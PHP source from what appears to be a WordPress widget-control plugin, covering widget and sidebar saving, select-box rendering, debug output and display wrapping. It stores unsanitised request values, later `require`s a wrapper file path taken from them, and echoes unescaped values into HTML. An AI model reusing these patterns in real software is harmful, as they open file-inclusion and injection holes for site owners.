 * 
 * @param array $fields
 * @return array
 */
function twc_save_default_sidebar( $fields, $new_instance, $old_instance, $this )
{
	//initializing variables
	$fields = wp_parse_args( $fields, $old_instance );
	
	if (array_key_exists('twcp_default_sidebar', $_REQUEST))
		$fields['twcp_default_sidebar'] = $_REQUEST['twcp_default_sidebar'];
	
	if (array_key_exists('twcp_exclude_sidebar', $_REQUEST))
		$fields['twcp_exclude_sidebar'] = $_REQUEST['twcp_exclude_sidebar'];
	
	if (array_key_exists('twcp_inherit_sidebar', $_REQUEST))
		$fields['twcp_inherit_sidebar'] = $_REQUEST['twcp_inherit_sidebar'];
	
	if (array_key_exists('twcp_wrapper_file', $_REQUEST))
		$fields['twcp_wrapper_file'] = $_REQUEST['twcp_wrapper_file'];
	
	if (array_key_exists('twcp_widget_title', $_REQUEST))
		$fields['twcp_widget_title'] = $_REQUEST['twcp_widget_title'];
	
	if (array_key_exists('twcp_status', $_REQUEST))
		$fields['twcp_status'] = $_REQUEST['twcp_status'];
	
	if (array_key_exists('twcp_visibility', $_REQUEST))
		$fields['twcp_visibility'] = $_REQUEST['twcp_visibility'];
	
	if (array_key_exists('twcp_publish_time', $_REQUEST))
		$fields['twcp_publish_time'] = $_REQUEST['twcp_publish_time'];
	
	if (array_key_exists('twcp_visible_parent', $_REQUEST))
		$fields['twcp_visible_parent'] = $_REQUEST['twcp_visible_parent'];
	
	return $fields;
}

/**
 * Function appends the menu item data to the instance fields
 * 
 * @TODO Need to also save the object type
 * @param array $fields
 * @return array $fields
 */
function twc_save_menu_items( $fields )
{
	//reasons to fail
	if (!array_key_exists('menu-item', $_REQUEST)) return $fields;
	
	//initializing variables
	$object_ids = array();
	$menu_item_urls = array();
	
	foreach ((array)$_REQUEST['menu-item'] as $item) 
		foreach ((array)$item as $menu_item => $id)
		{
			//saving the menu item url
			if ($menu_item == 'menu-item-url')
			{
				$menu_item_urls[$id] = $id;
			}
			
			//saving the object ID
			if ($menu_item == 'menu-item-object-id') 
			{
				$object_ids[$id] = $id;
			}
		}
	
	$fields['menu_item_object_id'] = $object_ids;
	$fields['menu_item_urls'] = $menu_item_urls;
	return $fields;
}

/**
 * Function accepts the widget id and the sidebar and saves the 
 * relationship.
 *
 * @param string $widget_id
 * @param string $sidebar_id
 */
function twc_save_widget_sidebar( $widget_id, $sidebar_id, $position = 0, $delete = false )
{
	if (!$widget_id || !current_user_can('activate_plugins'))
		return false;
	
	//initializing variables
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	
	// remove old position
	foreach ( $sidebars_widgets as $key => $sb )
	{
		$sidebars_widgets[$key] = array_diff( (array)$sb, array($widget_id) );
	}
	
	array_splice( $sidebars_widgets[$sidebar_id], $position, 0, $widget_id );
	wp_set_sidebars_widgets($sidebars_widgets);
}

/**
 * This function accepts fields for a given widget and saves those fields to the db.
 *
 * @param string $widget_id
 * @param array $fields
 */

function twc_save_widget_fields( $widget_id, $post )
{
	//initializing variables
	if (!$widget_id || !current_user_can('activate_plugins'))
	{
		wp_redirect(get_bloginfo('url').'/wp-admin/widgets.php?message=0');
		exit;
	}
	
	//initializing variables
	global $wp_registered_widget_updates;
	$fields = $post;
	$_POST = array();
	$widget = twc_get_widget_by_id($widget_id);
	$id_base = _get_widget_id_base($widget['id']);
	$ignore = array('sidebar_slug','id_base','widget-width','widget-height',
	'widget_number','multi_number','action','redirect','editwidget','addnew','base','num',
	'view');
	
	
	if ($widget['multiwidget'])
	{
		//variable as constructed by wordpress
		if (isset($post['widget-'.$id_base])
		&& isset($post['widget-'.$id_base][$widget['number']]))
		{
			$fields = $post['widget-'.$id_base][$widget['number']];
		}
	}
	
	//filtering the fields
	foreach ($fields as $key => $value)
	{
		if (in_array($key, (array)$ignore))
		{
			unset($fields[$key]);
		}
	}
	

	if ($widget['multiwidget'])
	{
		$_POST['widget-'.$id_base][$widget['number']] = apply_filters('twc-save-widget-fields', $fields);
		$_POST['multi_number'] = $widget['number'];
	}
	else
	{
		$_POST = apply_filters('twc-save-widget-fields', $fields);
		
		//take the data handling into our own hands if this is not a multiwidget
		$singles = get_option('twc_single_widget_data', array());
		$singles[$widget['id']] = $_POST;
		update_option('twc_single_widget_data', $singles);
	}
	
	//this calls the widgets update function with the given params
	foreach ( (array) $wp_registered_widget_updates as $name => $control )
	{
		if ( $name != $id_base || !is_callable($control['callback']) )
			continue;
	
		ob_start();
			call_user_func_array( $control['callback'], $control['params'] );
		ob_get_clean();
		break;
	}
	return true;
}

/**
 * 
 *
 * @return unknown
 */
function twc_search_list_for()
{
	if (!isset($_REQUEST['twcp_search_input']) || empty($_REQUEST['twcp_search_input'])) return false;
	$_REQUEST['inactive'] = 'active';
	
	return $_REQUEST['twcp_search_input'];
}

/**
 * function is responsible for setting the current url
 *
 */
function twc_set_object_url()
{
	//initializing variables
	global $twc_menu_item_url;
	
	//reasons to fail
	if (isset($twc_menu_item_url)) return $twc_menu_item_url;
	$twc_menu_item_url = f20_get_page_url();
	return $twc_menu_item_url;
}

/**
 * Save the original object id
 * 
 * @return string $twc_menu_item_object_id
 */
function twc_set_object_id()
{
	//initializing variables
	global $wp_query;
	static $twc_menu_item_object_id;
	
	//reasons to fail
	if (isset($twc_menu_item_object_id)) return $twc_menu_item_object_id;
	
	if (!isset($wp_query))
	{
		wp_reset_query();
	}
	
	if (!$wp_query->have_posts())
	{
		//this is used for the admin area
		if (isset($_REQUEST['post']) && $post = get_post($_REQUEST['post']))
		{
			if ($post->post_type == 'page')
			{
				$query = array('page_id' => $post->ID);
			}
			else
			{
				$query = array('p' => $post->ID, 'post_type' => 'any');
			}
		}
		$wp_query->query($query);
	}
	
	//now that the wp_query is setup, we get the object id
	$wp_query->get_queried_object();
	$twc_menu_item_object_id = $wp_query->queried_object_id;
	return $twc_menu_item_object_id;
}

/**
 * function shows debug info
 * 
 * @return unknown
 */
function twc_show_object_id()
{
	//initializing varaibles
	$debug_locations = (isset($_REQUEST['twc_debug']));
	
	//reasons to fail
	if ( TWC_CURRENT_USER_CANNOT ) return false;
	if (!$debug_locations) return false;
	echo '<div style="position:absolute;top:0px;left:0px;background:#fff;padding:5px;">'.twc_get_object_id().'</div>';
}

/**
 * Just prints a sidebar
 *
 * @param unknown_type $default
 * @return unknown
 */
function twc_sidebar_select_box( $default = 'wp_inactive_widgets', $widget = null, $format = false, $name = null )
{
	//initializing variables
	global $wp_registered_sidebars;
	$sidebars = $wp_registered_sidebars;
	$class = array('','selected="true"');
	$select_filter = '';
	
	if (!is_null($name))
	{
		$id = 'twc_sidebar_select_box_'.$widget['id'];
	}
	elseif ($format)
	{
		$id = 'twc_sidebar_select_box_'.$widget['id'];
		$name = 'sidebar';
	}
	elseif (!is_null($widget))
	{
		$id = 'twc_sidebar_select_box_'.$widget['id'];
		$name = 'widget-'.$widget['id_base'].'['.$widget['number'].'][sidebar_slug]';
	}
	
	$select = '<select id="'.$id.'" name="'.$name.'" class="twc_sidebar_select_box">'.$select_filter;
	
	foreach ($sidebars as $slug => $sidebar)
	{
		$selected = 0;
		if ($default == $slug) $selected = 1;
		$select .= "<option {$class[$selected]} value='$slug'>{$sidebar['name']}</option>";
	}
	
	return $select.'</select>';
}

/**
 * Just prints a filter sidebar
 * 
 * @return unknown
 */
function twc_sidebar_filter_box()
{
	//initializing variables
	global $wp_registered_sidebars;
	$sidebars = $wp_registered_sidebars;
	$class = array('','selected="true"');
	$default = twc_filter_list_for();
	
	$select = '<select name="twcp_filter" class="twc_sidebar_filter_box">'
			. '<option value="">  -  '.__('Remove Filter','twc').'  -  </option>';
		
	foreach ($sidebars as $slug => $sidebar)
	{
		$selected = 0;
		if ($default == $slug) $selected = 1;
		$select .= "<option {$class[$selected]} value='$slug'>{$sidebar['name']}</option>";
	}
	
	return $select.'</select>';
}

/**
 * function is responsible for putting the widget back together.
 * This function also keeps track of the widget loop within the dynamic_sidebar.
 * Once the dynamic_sidebar function is completed, we declare a do_action to
 * activate our own sidebar function.
 *
 * @param unknown_type $widget
 */
function twc_trigger_sidebar( $widget_shell )
{
	//initializing variables
	global $wp_registered_widgets, $twc_wp_registered_widgets;
	static $keeping_count;
	$debug_locations = (isset($_REQUEST['twc_debug']));
	$sidebar_id = twc_get_widgets_sidebar($widget_shell['id']);
	$count = twc_count_sidebar_widgets($sidebar_id);
	
	if (!isset($keeping_count))
	{
		$keeping_count = 0;
	}
	$keeping_count++;
	
	if ($count == $keeping_count)
	{
		//ensures that we have a well formed widget variable before calling our sidebar
		$wp_registered_widgets = $twc_wp_registered_widgets;
		if ($debug_locations) echo '<div style="border: 1px dashed pink;min-height:25px;"><b>'.$sidebar_id.'</b>';
		if (TWC_IS_SORTER) echo '<div class="twc_sortable_sidebar">';
		
		do_action('twc_dynamic_sidebar', $sidebar_id);
		
		if (TWC_IS_SORTER) echo '</div>';
		if ($debug_locations) echo '</div>';
		
		$keeping_count = 0;
	}
	
}

/**
 * Button encourages the user to upgrade to pro
 *
 */
function twc_upgrade_button()
{
	if (function_exists('twc_widget_protitle')) return;
	echo '<a class="twc_upgrade_button button-primary" href="'.get_bloginfo('url').'/wp-admin/widgets.php?action=register&license=1">'.__('Upgrade to Pro $9','twc').'</a>';
}

/**
 * This function adds the view switches to the wordpress widget page
 *
 * @return unknown
 */
function twc_view_switch()
{
	//initializing variables
	$current_screen = twc_get_current_screen();
	
	//reasons to fail
	if ((!$GLOBALS['TWCAUTH']) && (twc_list_style_twc() 
	|| $current_screen->parent_base != 'widgets')) return false;
	
	echo '<div>'.twc_get_show_view('twc-view-switch').'</div>';
	
}

/**
 * Function sets the global $widget variable
 *
 * @return null
 */
function twc_widget_global()
{
	//initializingn variables
	global $widget;
	$widget_id = (isset($_REQUEST['widget_id']))? $_REQUEST['widget_id']: ((isset($_REQUEST['widget-id']))? $_REQUEST['widget-id'] : ((isset($_REQUEST['editwidget']))? $_REQUEST['editwidget']: false));
	
	//loading resources
	$widget = twc_get_widget_by_id( $widget_id );
	
	//reasons to return
	if (!$widget) return;
	
}

/**
 * Function returns the widgets grouped by sidebar
 *
 * @return unknown
 */
function twc_wp_get_sidebars_widgets()
{
	$sidebars_widgets = wp_get_sidebars_widgets();
	if ( empty( $sidebars_widgets ) )
		$sidebars_widgets = wp_get_widget_defaults();
	
	return $sidebars_widgets;
}

/**
 * Function is paving the way for the front end sortables for administrators
 *
 * @param string $display
 * @param object $widget
 * @return string
 */
function twc_sortable_wrapper( $display, $widget )
{
	return '<div class="twc_sortable_widget" id="twc-'.$widget['id'].'" position="'.$widget['position'].'">'
		.$display
		.'</div>';
}

/**
 * wraps the widget display
 *
 * @param unknown_type $display
 * @param unknown_type $widget
 * @return unknown
 */
function twcp_widget_wrapper( $display, $widget )
{
	//initializing variables
	global $twc_widget_to_wrap, $twc_widget;
	$hasWrapper = (isset($widget['p']['twcp_wrapper_file']) && $widget['p']['twcp_wrapper_file']);
	$wrapper = $widget['p']['twcp_wrapper_file'];
	
	//reasons to return
	if (!$hasWrapper || !$wrapper || !is_file($wrapper) || !file_exists($wrapper)) 
		return $display;
	
	//initializing variables
	$twc_widget_to_wrap = $display;
	$twc_widget = $widget;
	
	ob_start();
	require $wrapper;
	return ob_get_clean();
}

/**
 * function is responsible for returning the widget class
 * 
 */
function twc_widget_object()
{
	//initializing variables
	global $twc_widget;
	return $twc_widget;
}

/**
 * function is responsible for returning the complete sidebar info
 *
 */
function twc_get_widget_sidebar()
{
	//initializing variables
	global $wp_registered_sidebars;
	$widget = twc_widget_object();
	$sidebar_id = twc_get_widgets_sidebar($widget['id']);
	
	return $wp_registered_sidebars[$sidebar_id];
}

/**
 * function is responsible for including the required files for sortables
 *
 */
function twc_sortable_initialize()
{
	//reasons to fail
	if (!TWC_IS_SORTER) return false;
	
	wp_enqueue_script( 'jquery' );
	wp_enqueue_script( 'jquery-ui-sortable' );
	wp_enqueue_script( 'twc-sortables' );
	
	wp_enqueue_style( 'twc-sortables' );
	
}





